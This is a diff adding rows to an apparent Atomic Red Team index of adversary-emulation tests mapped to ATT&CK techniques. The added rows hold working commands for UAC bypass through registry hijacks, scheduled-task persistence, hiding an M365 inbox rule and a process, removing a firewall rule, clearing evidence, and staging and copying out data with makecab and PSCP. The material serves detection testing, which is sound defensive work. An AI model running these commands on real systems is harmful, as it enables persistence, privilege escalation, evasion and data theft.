@@ -1849,6 +1849,10 @@ input_arguments.teamviewer_log_file.type: string
 input_arguments.teamviewer_log_file.default: $env:TEMP\TeamViewer_54.log
 
 "
+T1070.004,Indicator Removal on Host: File Deletion,Clears Recycle bin via rd,f723d13d-48dc-4317-9990-cf43a9ac0bf2,"An adversary clears the recycle bin in the system partition using rd to remove traces of deleted files.
+[Reference](https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/)
+",windows,,,"rd /s /q %systemdrive%\$RECYCLE.BIN
+",command_prompt,True,,,,,
 T1610,Deploy a container,Deploy Docker container,59aa6f26-7620-417e-9318-589e0fb7a372,"Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. They can do this using docker create and docker start commands. Kinsing & Doki was exploited using this technique. 
 ",containers,,,"docker build -t t1610 $PathtoAtomicsFolder/T1610/src/
 docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
@@ -4252,6 +4256,49 @@ Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" ""PathToA
 Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"" ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -Force
 
 ",
+T1564.008,Hide Artifacts: Email Hiding Rules,New-Inbox Rule to Hide E-mail in M365,30f7d3d1-78e2-4bf0-9efa-a175b5fce2a9,"This test simulates a user adding an inbox rule in M365 to delete emails with specific keywords in email subject or body.
+ Reference: https://www.mandiant.com/sites/default/files/2021-09/rpt-fin4.pdf
+",azure-ad,,,"Import-Module ExchangeOnlineManagement
+$password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
+$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
+Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue
+New-InboxRule -Mailbox #{target_mailbox} -Name #{mail_rulename} -SubjectOrBodyContainsWords (""phish"",""malware"",""hacked"") -Confirm:$false -DeleteMessage:$true
+",powershell,False,,"Import-Module ExchangeOnlineManagement
+$password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
+$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
+Connect-ExchangeOnline -Credential $credential
+Remove-InboxRule -Mailbox #{target_mailbox} -Identity #{mail_rulename} -Confirm:$false
+",powershell,"dependencies.0.description: ExchangeOnlineManagement module must be installed.
+
+dependencies.0.prereq_command: try {if (Get-InstalledModule -Name ExchangeOnlineManagement -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+
+dependencies.0.get_prereq_command: Install-Module -Name ExchangeOnlineManagement -Force
+
+","input_arguments.auth_username.description: M365 Username
+
+input_arguments.auth_username.type: string
+
+input_arguments.auth_username.default: john@contoso.com
+
+input_arguments.auth_password.description: M365 Password
+
+input_arguments.auth_password.type: string
+
+input_arguments.auth_password.default: p4sswd
+
+input_arguments.mail_rulename.description: Name of the inbox rule.
+
+input_arguments.mail_rulename.type: string
+
+input_arguments.mail_rulename.default: default
+
+input_arguments.target_mailbox.description: Mailbox you are creating the rule in
+
+input_arguments.target_mailbox.type: string
+
+input_arguments.target_mailbox.default: jane@contoso.com
+
+"
 T1003.007,OS Credential Dumping: Proc Filesystem,Dump individual process memory with sh (Local),7e91138a-8e74-456d-a007-973d67a0bb80,"Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
 copy process memory to an external file so it can be searched or exfiltrated later.
 ",linux,,,"sh #{script_path}
@@ -5956,6 +6003,11 @@ input_arguments.output_file.default: $env:temp\T1592.002Test1.txt
 T1012,Query Registry,Reg query for AlwaysInstallElevated status,6fb4c4c5-f949-4fd2-8af5-ddbc61595223,"The reg query commands allows to check the status of the AlwaysInstallElevated registry key for both the user and the machine. If both queries return a value of 0x1, then AlwaysInstallElevated is enabled for both user and machine thus allowing a regular user to install a Microsoft Windows Installer package with system level privileges. This can be abused by an attacker to escalate privileges in the host to SYSTEM level.",windows,,,"reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated      
 ",command_prompt,True,,,,,
+T1012,Query Registry,Check Software Inventory Logging (SIL) status via Registry,5c784969-1d43-4ac7-8c3d-ed6d025ed10d,"Microsoft's Software Inventory Logging (SIL) collects information about software installed per host basis. Adversary can use such logs to passively 
+check for existence of software of interest to them. Status of SIL can be checked via registry.
+[Reference](https://blog.talosintelligence.com/chinese-hacking-group-apt41-compromised-taiwanese-government-affiliated-research-institute-with-shadowpad-and-cobaltstrike-2/)
+",windows,,,"reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
+",command_prompt,True,,,,,
 T1222.001,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,Take ownership using takeown utility,98d34bb4-6e75-42ad-9c41-1dae7dc6a001,"Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, ""SUCCESS"" will
 be displayed for the folder and each file inside of it.
 ",windows,,,"takeown.exe /f #{file_folder_to_own} /r
@@ -6691,6 +6743,29 @@ input_arguments.password.description: password used to log into ESXI
 input_arguments.password.type: string
 
 input_arguments.password.default: n/a
+
+"
+T1560.001,Archive Collected Data: Archive via Utility,Compress a File for Exfiltration using Makecab,2a7bc405-9555-4f49-ace2-b2ae2941d629,"An adversary may compress data using Makecab (in-built Windows binary) that is collected prior to exfiltration.
+[reference](https://unit42.paloaltonetworks.com/exchange-server-credential-harvesting/)
+",windows,,,"makecab.exe #{input_file} #{output_file}
+",command_prompt,False,,"del #{output_file}
+",,"dependencies.0.description: A sample file for compression must be located at specified location (#{input_file})
+
+dependencies.0.prereq_command: if not exist ""#{input_file}"" (exit /b 1)
+
+dependencies.0.get_prereq_command: fsutil file createnew c:\Temp\sam.hiv 10485760
+
+","input_arguments.input_file.description: Path to source file for compression
+
+input_arguments.input_file.type: path
+
+input_arguments.input_file.default: C:\Temp\sam.hiv
+
+input_arguments.output_file.description: Path of the CAB file
+
+input_arguments.output_file.type: path
+
+input_arguments.output_file.default: C:\Temp\art.zip
 
 "
 T1140,Deobfuscate/Decode Files or Information,Deobfuscate/Decode Files Or Information,dc6fe391-69e6-4506-bd06-ea5eeb4082f8,"Encode/Decode executable
@@ -11154,6 +11229,66 @@ input_arguments.local_file_path.type: path
 input_arguments.local_file_path.default: C:\T1105.zip
 
 "
+T1105,Ingress Tool Transfer,Remote File Copy using PSCP,c82b1e60-c549-406f-9b00-0a8ae31c9cfe,"Copy a staged file using PSCP.exe to a public target location.
+",windows,,,"fsutil file createnew C:\Temp\T1105_scp.zip 1048576
+echo y | #{pscp_binary} -P #{scp_port} -pw #{scp_password} #{exfil_package} #{scp_user}@#{target_location}:#{target_filename}
+",command_prompt,False,,"del /f /q #{exfil_package}
+",powershell,"dependencies.0.description: pscp.exe must be available on the system.
+
+dependencies.0.prereq_command: if (Test-Path #{pscp_binary}) {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""#{pscp_url}"" -Outfile ""PathToAtomicsFolder\..\ExternalPayloads\pscp.exe""
+
+","input_arguments.pscp_url.description: pscp.exe download path
+
+input_arguments.pscp_url.type: string
+
+input_arguments.pscp_url.default: https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe
+
+input_arguments.pscp_binary.description: PSCP binary location
+
+input_arguments.pscp_binary.type: string
+
+input_arguments.pscp_binary.default: PathToAtomicsFolder\..\ExternalPayloads\pscp.exe
+
+input_arguments.scp_user.description: Username of the SCP user
+
+input_arguments.scp_user.type: string
+
+input_arguments.scp_user.default: atomic
+
+input_arguments.scp_password.description: Password for the SCP User
+
+input_arguments.scp_password.type: string
+
+input_arguments.scp_password.default: atomic
+
+input_arguments.scp_port.description: port for the remote server
+
+input_arguments.scp_port.type: string
+
+input_arguments.scp_port.default: 22
+
+input_arguments.exfil_package.description: path to exfil package
+
+input_arguments.exfil_package.type: path
+
+input_arguments.exfil_package.default: C:\Temp\T1105_scp.zip
+
+input_arguments.target_location.description: Remote location where the data will be copied to.
+
+input_arguments.target_location.type: string
+
+input_arguments.target_location.default: 127.0.0.1
+
+input_arguments.target_filename.description: Filename on the destination.
+
+input_arguments.target_filename.type: string
+
+input_arguments.target_filename.default: T1105_scp.zip
+
+"
 T1547.002,Authentication Package,Authentication Package,be2590e8-4ac3-47ac-b4b5-945820f2fbe9,"Establishes persistence using a custom authentication package for the Local Security Authority (LSA).
 After a reboot, Notepad.exe will be executed as child process of lsass.exe.
 Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package
@@ -12799,6 +12934,13 @@ input_arguments.ms_product.type: string
 input_arguments.ms_product.default: Word
 
 "
+T1222,File and Directory Permissions Modification,Enable Local and Remote Symbolic Links via fsutil,6c4ac96f-d4fa-44f4-83ca-56d8f4a55c02,"Use fsutil to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths.
+[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)
+",windows,,,"fsutil behavior set SymlinkEvaluation R2L:1 
+fsutil behavior set SymlinkEvaluation R2R:1
+",command_prompt,True,,"fsutil behavior set SymlinkEvaluation R2L:0
+fsutil behavior set SymlinkEvaluation R2R:0
+",,,
 T1556.003,Modify Authentication Process: Pluggable Authentication Modules,Malicious PAM rule,4b9dde80-ae22-44b1-a82a-644bf009eb9c,"Inserts a rule into a PAM config and then tests it.
 
 Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
@@ -18027,7 +18169,8 @@ For further exploration of this procedure and guidance for hunting and detection
 ",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\#{target} -accepteula -s ""cmd.exe""
 ""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"" \\#{target} add #{task_name} ""cmd.exe"" ""/c #{task_command}"" #{user_name} logon
 ",command_prompt,True,,"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\#{target} -accepteula -s ""cmd.exe""
-""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"" \\#{target} delete #{task_name} > nul",powershell,"dependencies.0.description: PsExec tool from Sysinternals must exist in the ExternalPayloads directory
+""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"" \\#{target} delete #{task_name} > nul
+",powershell,"dependencies.0.description: PsExec tool from Sysinternals must exist in the ExternalPayloads directory
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"") { exit 0} else { exit 1}
 
@@ -18066,6 +18209,27 @@ input_arguments.user_name.description: Username to authenticate with, such as AT
 input_arguments.user_name.type: string
 
 input_arguments.user_name.default: $env:USERDOMAIN + '\' + $env:USERNAME
+
+"
+T1053.005,Scheduled Task/Job: Scheduled Task,Scheduled Task Persistence via CompMgmt.msc,8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2,"Adds persistence by abusing `compmgmt.msc` via a scheduled task.
+When the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). 
+This technique abuses scheduled tasks and registry modifications to hijack legitimate system processes.
+",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\#{payload}"" /f
+schtasks /Create /TN ""#{task_name}"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F
+ECHO Let's open the Computer Management console now...
+compmgmt.msc
+",command_prompt,True,,"reg delete ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /f
+schtasks /Delete /TN ""#{task_name}"" /F",,,"input_arguments.task_name.description: Name of the newly-created scheduled task
+
+input_arguments.task_name.type: string
+
+input_arguments.task_name.default: CompMgmtBypass
+
+input_arguments.payload.description: Command you want the task to execute
+
+input_arguments.payload.type: string
+
+input_arguments.payload.default: calc.exe
 
 "
 T1543.003,Create or Modify System Process: Windows Service,Modify Fax service to run PowerShell,ed366cde-7d12-49df-a833-671904770b9f,"This test will temporarily modify the service Fax by changing the binPath to PowerShell
@@ -18548,6 +18712,10 @@ input_arguments.pchunter64_exe.type: string
 input_arguments.pchunter64_exe.default: PChunter64.exe
 
 "
+T1057,Process Discovery,Launch Taskmgr from cmd to View running processes,4fd35378-39aa-481e-b7c4-e3bf49375c67,"An adverary may launch taskmgr.exe with the /7 switch via command prompt to view processes running on the system.
+[Reference](https://github.com/trellix-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Conti_Ransomware.yml)
+",windows,,,"taskmgr.exe /7
+",command_prompt,False,,,,,
 T1069.001,Permission Groups Discovery: Local Groups,Permission Groups Discovery (Local),952931a4-af0b-4335-bbbe-73c8c5b327ae,"Permission Groups Discovery
 ",linux,macos,,"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi;
 if [ -x ""$(command -v dscl)"" ]; then dscl . -list /Groups; else echo ""dscl is missing from the machine. skipping...""; fi;
@@ -19094,6 +19262,16 @@ T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Disable
 T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Disable ConsentPromptBehaviorAdmin via registry keys,a768aaa2-2442-475c-8990-69cf33af0f4e,"This atomic regarding setting ConsentPromptBehaviorAdmin to 0 configures the UAC so that it does not prompt for consent or credentials when actions requiring elevated privileges are performed by users in the administrators group. This means that any operation that would normally trigger a UAC prompt will proceed automatically without user interaction.
 ",windows,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 ",command_prompt,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
+",,,
+T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UAC bypassed by Utilizing ProgIDs registry.,b6f4645c-34ea-4c7c-98f2-d5a2747efb08,"This atomic designed to simulate the UAC bypassed made by ValleyRAT by adding customized ProgIDs registry entry.
+",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"" /ve /d ""C:\Windows\System32\calc.exe"" /f
+
+reg add ""HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"" /ve /d "".pwn"" /f
+
+echo Triggering fodhelper.exe for potential privilege escalation...
+start fodhelper.exe
+",command_prompt,,,"reg delete ""HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"" /ve /f
+reg delete ""HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"" /ve /f
 ",,,
 T1036.006,Masquerading: Space after Filename,Space After Filename (Manual),89a7dd26-e510-4c9f-9b15-f3bae333360f,"Space After Filename
 ",macos,,,,manual,,"1. echo '#!/bin/bash\necho ""print \""hello, world!\"""" | /usr/bin/python\nexit' > execute.txt && chmod +x execute.txt
@@ -21783,15 +21961,15 @@ dependencies.0.get_prereq_command: echo """"
 ",
 T1562.004,Impair Defenses: Disable or Modify System Firewall,Modify/delete iptables firewall rules,899a7fb5-d197-4951-8614-f19ac4a73ad4,"Instead of completely ""disabling"" iptables, adversaries may choose to delete a certain rule, which, for example, blocks data exfiltration via ftp.
 By doing so, they may cause less noise to avoid detection. 
-",linux,,,"iptables-save > /tmp/iptables.rules
-iptables -D OUTPUT -p tcp --dport 21 -j DROP
+",linux,,,"iptables -D OUTPUT -p tcp --dport 21 -j DROP
 ",sh,True,,"iptables-restore < /tmp/iptables.rules
 ",sh,"dependencies.0.description: Check if iptables is installed on the machine.
 
 dependencies.0.prereq_command: if [ ! -x ""$(command -v iptables)"" ]; then echo -e ""\n***** iptables NOT installed *****\n""; exit 1; fi
 if ! echo ""$(iptables -L)"" | grep -q ""DROP .*dpt:ftp""; then echo -e ""\n***** this firewall rule is NOT activated *****\n***** activate it by executing \""iptables -A OUTPUT -p tcp --dport 21 -j DROP\"" *****\n""; exit 1; fi
 
-dependencies.0.get_prereq_command: echo """"
+dependencies.0.get_prereq_command: iptables-save > /tmp/iptables.rules
+if echo ""$(iptables -L)"" | grep -q ""DROP .*dpt:ftp""; then echo ""Rule found""; else echo ""Rule not found. Setting it...""; iptables -A OUTPUT -p tcp --dport 21 -j DROP; fi
 
 ",
 T1562.004,Impair Defenses: Disable or Modify System Firewall,LockBit Black - Unusual Windows firewall registry modification -cmd,a4651931-ebbb-4cde-9363-ddf3d66214cb,"An adversary tries to modify the windows firewall registry
@@ -22050,6 +22228,14 @@ input_arguments.exe_path.type: path
 input_arguments.exe_path.default: /tmp/T1036_004_prctl_rename
 
 "
+T1036.004,Masquerading: Masquerade Task or Service,Hiding a malicious process with bind mounts,ad4b73c2-d6e2-4d8b-9868-4c6f55906e01,"Creates a malicious process and hides it by bind mounting to the /proc filesystem of a benign process
+",linux,,,"eval '(while true; do :; done) &'
+echo $! > /tmp/evil_pid.txt
+random_kernel_pid=$(ps -ef | grep ""\[.*\]"" | awk '{print $2}' | shuf -n 1)
+sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)
+",sh,True,,"kill $(cat /tmp/evil_pid.txt) || echo ""Failed to kill PID $evil_pid""
+rm /tmp/evil_pid.txt
+",,,
 T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Reg Key Run,e55be3fd-3521-4610-9d1a-e210e42dcf05,"Run Key Persistence
 
 Upon successful execution, cmd.exe will modify the registry by adding \""Atomic Red Team\"" to the Run key. Output will be via stdout. 
@@ -23006,16 +23192,16 @@ Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\cop
 ",powershell,True,,"Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore
 ",,,
 T1070.008,Email Collection: Mailbox Manipulation,Copy and Delete Mailbox Data on Linux,25e2be0e-96f7-4417-bd16-a4a2500e3802,"Copies and deletes mail data on Linux
-",linux,,,"mkdir -p /var/spool/mail/copy
-for file in /var/spool/mail/*; do
-  if [ ""$(basename ""$file"")"" != ""copy"" ]
-  then
-    cp -R ""$file"" /var/spool/mail/copy/
-  fi
-done
-rm -rf /var/spool/mail/copy/*
+",linux,,,"mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*
 ",bash,True,,"rm -rf /var/spool/mail/copy
-",,,
+if [ -f ""$(ls -A /var/spool/mail/temp)"" ]; then rm /var/spool/mail/temp; fi
+",,"dependencies.0.description: Create dummy file in /var/spool/mail/ if no files exist
+
+dependencies.0.prereq_command: if [ -z ""$(ls -A /var/spool/mail/)"" ]; then exit 1; else exit 0; fi
+
+dependencies.0.get_prereq_command: if [ -z ""$(ls -A /var/spool/mail/)"" ]; then touch /var/spool/mail/temp; fi
+
+",
 T1070.008,Email Collection: Mailbox Manipulation,Copy and Delete Mailbox Data on macOS,3824130e-a6e4-4528-8091-3a52eeb540f6,"Copies and deletes mail data on macOS
 ",macos,,,"mkdir ~/Library/Mail/copy
 cp -R ~/Library/Mail/* ~/Library/Mail/copy
@@ -23029,18 +23215,16 @@ Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\c
 ",powershell,True,,"Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore
 ",,,
 T1070.008,Email Collection: Mailbox Manipulation,Copy and Modify Mailbox Data on Linux,6d99f93c-da56-49e3-b195-163090ace4f6,"Copies and modifies mail data on Linux
-",linux,,,"mkdir -p /var/spool/mail/copy
-for file in /var/spool/mail/*; do
-  if [ ""$(basename ""$file"")"" != ""copy"" ]
-  then
-    cp -R ""$file"" /var/spool/mail/copy/
-    if [ -f ""/var/spool/mail/copy/$(basename ""$file"")"" ]; then
-      echo ""Modification for Atomic Red Test"" >> ""/var/spool/mail/copy/$(basename ""$file"")""
-    fi
-  fi
-done
+",linux,,,"mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; if [ -f ""/var/spool/mail/copy/$(basename ""$file"")"" ]; then echo ""Modification for Atomic Red Test"" >> ""/var/spool/mail/copy/$(basename ""$file"")""; fi; fi; done
 ",bash,True,,"rm -rf /var/spool/mail/copy
-",,,
+if [ -f ""$(ls -A /var/spool/mail/temp)"" ]; then rm /var/spool/mail/temp; fi
+",,"dependencies.0.description: Create dummy file in /var/spool/mail/ if no files exist
+
+dependencies.0.prereq_command: if [ -z ""$(ls -A /var/spool/mail/)"" ]; then exit 1; else exit 0; fi
+
+dependencies.0.get_prereq_command: if [ -z ""$(ls -A /var/spool/mail/)"" ]; then touch /var/spool/mail/temp; fi
+
+",
 T1070.008,Email Collection: Mailbox Manipulation,Copy and Modify Mailbox Data on macOS,8a0b1579-5a36-483a-9cde-0236983e1665,"Copies and modifies mail data on macOS
 ",macos,,,"mkdir ~/Library/Mail/copy
 cp -R ~/Library/Mail/* ~/Library/Mail/copy
@@ -28388,6 +28572,22 @@ input_arguments.server_port.description: The port for the C2 connection
 input_arguments.server_port.type: integer
 
 input_arguments.server_port.default: 80
+
+"
+T1497.003,Time Based Evasion,Delay execution with ping,8b87dd03-8204-478c-bac3-3959f6528de3,"Uses the ping command to introduce a delay before executing a malicious payload.
+",linux,macos,,"ping -c #{ping_count} 8.8.8.8 > /dev/null
+#{evil_command}
+",sh,,,,,,"input_arguments.evil_command.description: Command to run after the delay
+
+input_arguments.evil_command.type: string
+
+input_arguments.evil_command.default: whoami
+
+input_arguments.ping_count.description: Number of ping requests to send (higher counts increase the delay)
+
+input_arguments.ping_count.type: integer
+
+input_arguments.ping_count.default: 250
 
 "
 T1127.001,Trusted Developer Utilities Proxy Execution: MSBuild,MSBuild Bypass Using Inline Tasks (C#),58742c0f-cb01-44cd-a60b-fb26e8871c93,"Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print ""Hello From a Code Fragment"" and ""Hello From a Class."" to the screen.
